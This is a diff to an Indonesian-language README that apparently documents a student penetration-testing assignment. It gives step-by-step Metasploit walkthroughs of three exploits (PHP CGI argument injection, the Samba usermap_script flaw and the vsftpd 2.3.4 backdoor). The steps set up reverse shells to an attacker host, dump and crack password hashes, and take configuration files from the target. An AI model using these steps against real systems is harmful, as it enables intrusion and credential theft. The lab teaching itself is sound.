@@ -89,39 +89,171 @@ Nmap (atau "Network Mapper") adalah sebuah program open source yang berguna untu
 
 ### Exploit : php_cgi_arg_injection, Post Exploitation : enum_system
 1. Penjelasan exploit php_cgi_arg_injection dapat dilihat pada [https://pentesterlab.com/exercises/cve-2012-1823/course]
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/1.PNG?raw=true)
+</p>
 2. Vulnerability yang akan kita coba bobol kali ini akan menggunakan exploit yaitu php_cgi_arg_injection. Setelah membuka msfconsole, kita dapat memasukkan perintah `use exploit/multi/http/php_cgi_arg_injection`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/2.PNG?raw=true)
+</p>
 3. Masukkan IP alamat target yang akan diserang dengan memasukkan `set RHOST [IP_TARGET]`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/3.PNG?raw=true)
+</p>
 4. Payload yang akan kita gunakan adalah reverse_tcp, `set PAYLOAD php/meterpreter/reverse_tcp`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/4.PNG?raw=true)
+</p>
 5. Masukkan IP alamat penyerang, `set LHOST [IP_ATTACKER]`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/5.PNG?raw=true)
+</p>
 6. Untuk melihat status dapat dilakukan dengan `show options`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/6.PNG?raw=true)
+</p>
 7. Setelah kita masuk di meterpreter, kita dapa melihat list file dengan memasukkan `ls`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/7.PNG?raw=true)
+</p>
 8. Untuk mengetahui id/username dari session kita, masukkan `getuid`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/8.PNG?raw=true)
+</p>
 9. Untuk mendapatkan informasi dari komputer, masukkan `sysinfo`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/9.PNG?raw=true)
+</p>
 10. Untuk melakukan Post Exploitation, tekan ctrl+Z dan pilih `y`.
 11. Post Exploitation yang akan kita jalankan adalah enum_system, yaitu untuk mendapatkan informasi dari sistem target. Masukkan `use post/linux/gather/enum_system`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/10.PNG?raw=true)
+</p>
 12. Set session sesuai ID session yang terbuka, `set SESSION [SESSION_ID]`.
 13. Jalankan exploit dengan perintah `run`. Maka akan mendapatkan info seperti di bawah ini (karena session yang terbuka bukanlah root, jadi yang bisa kita dapatkan hanya sebatas informasi-informasi seperti OS).
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/11.PNG?raw=true)
+</p>
 
 ### Exploit : usermap_script, Post Exploitation : hashdump
 1. Vulnerability kedua yang akan kita coba bobol kali ini akan menggunakan exploit usermap_script (SAMBA). Masukkan perintah `use exploit/multi/samba/usermap_script`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/1.PNG?raw=true)
+</p>
 2. Masukkan `show payloads` untuk melihat payload apa saja yang dapat kita gunakan.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/2.PNG?raw=true)
+</p>
 3. Payload yang akan kita gunakan adalah `cmd/unix/reverse`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/3.PNG?raw=true)
+</p>
 4. Masukkan perintah `set PAYLOAD cmd/unix/reverse`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/4.PNG?raw=true)
+</p>
 5. Masukkan IP target dengan `set RHOST [IP_TARGET]`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/5.PNG?raw=true)
+</p>
 6. Masukkan port target yang akan kita buka, `set RPORT 445`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/6.PNG?raw=true)
+</p>
 7. Masukkan IP penyerang dengan `set LHOST [IP_ATTACKER]`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/7.PNG?raw=true)
+</p>
 8. Jalankan exploit dengan `exploit`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/8.PNG?raw=true)
+</p>
 9. Jika sudah kita jalankan dan berhasil, tandanya seperti di bawah ini.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/9.PNG?raw=true)
+</p>
 10. Berikut ini contoh-contoh perintah yang dapat kita masukkan.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/10.PNG?raw=true)
+</p>
 11. Tekan ctrl+Z dan pilih `y`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/11.PNG?raw=true)
+</p>
 12. Untuk melihat daftar session yang terbuka dapat kita lakukan dengan `sessions -l`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/12.PNG?raw=true)
+</p>
 13. Kali ini kita akan melakukan Post Exploitation yang bernama hashdump untuk mendapatkan database. Masukkan perintah `use post/linux/gather/hashdump`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/13.PNG?raw=true)
+</p>
 14. Set session yang terbuka, `set SESSION [ID_SESSION]`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/14.PNG?raw=true)
+</p>
 15. Jalankan exploit dengan memasukkan `exploit`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/15.PNG?raw=true)
+</p>
 16. Databse berupa usernam password yang berhasil kita dapatkan telah di enkripsi. Untuk itu kita perlu melakukan *dictionary attack* dengan bantuan tool lain yaitu *John de Ripper*. Pertama masuklah ke direktori `/usr/sbin`. Jalan kan file john ddengan perintah `./john [ALAMAT_FILE_DUMP]`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/16.PNG?raw=true)
+</p>
 
 ### Exploit : vsftpd_234_backdoor, Post Exploitation : enum_configs
-
+1. Pertama-tama kita scan dulu vulnerability dengan mengunakan nmap.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/1.PNG?raw=true)
+</p>
+2. Lalu kita search apakah ada exploit vsftpd.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/2.PNG?raw=true)
+</p>
+3. Sekarang kita gunakan exploit vsftpd_234_backdoor.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/3.PNG?raw=true)
+</p>
+4. Set IP Target (RHOST), agar aman LHOST (IP Penyerang) juga diatur.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/4.PNG?raw=true)
+</p>
+5. Set payload yang akan kita gunakan (di sini menggunakan cmd/unix/interact).
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/5.PNG?raw=true)
+</p>
+6. Jalankan exploit.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/6.PNG?raw=true)
+</p>
+7. Tekan ctrl + Z dan pilih `y`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/7.PNG?raw=true)
+</p>
+8. Cek session dengan `sessions -l`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/8.PNG?raw=true)
+</p>
+9. Lakukan Post Exploitation enum_configs untuk mendapatkan file-file konfigurasi yang ada pada komputer target. Lalu set SESSION sesuai ID Session yang telah terbuka.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/9.PNG?raw=true)
+</p>
+10. Jalankan post exploit dengan perintah `run`.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/10.PNG?raw=true)
+</p>
+11. Maka akan muncul seperti di bawah ini.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/11.PNG?raw=true)
+</p>
+12. Buka salah satu file yang berhasil diambil.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/12.PNG?raw=true)
+</p>
+13. Ini salah satu isi file pada konfigurasi apache.
+<p align="center">
+![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/13.PNG?raw=true)
+</p>
 
 ## Kesimpulan dan Saran
 
